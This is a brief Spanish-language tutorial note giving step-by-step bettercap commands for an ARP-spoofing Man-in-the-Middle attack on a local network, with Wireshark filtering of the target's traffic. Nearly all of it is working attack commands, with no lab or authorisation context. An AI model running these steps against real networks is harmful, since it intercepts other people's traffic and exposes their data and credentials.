Ataque Man in the Middle con bettercap:

instalar paquete bettecap (Debian)

1. sudo bettercap -iface ej: eth0 o wlan0

2. net.probe on lanza un escaneo de los equipos conectados

3. net.show muestra una tabla con informacion de los equipos conectados

4. set arp.spoof.fullduplex true

5. set arp.spoof.targets ip a atacar

6. Se recomienda iniciar wireshark antes del ataque para ver de forma comoda los paquetes

En wireshark seleccionar la interfaz de red a usar (eth0, wlan0...) y para filtrar por ip paquetes escribir

ip.addr == ip

7. arp.spoof on para iniciar el ataque
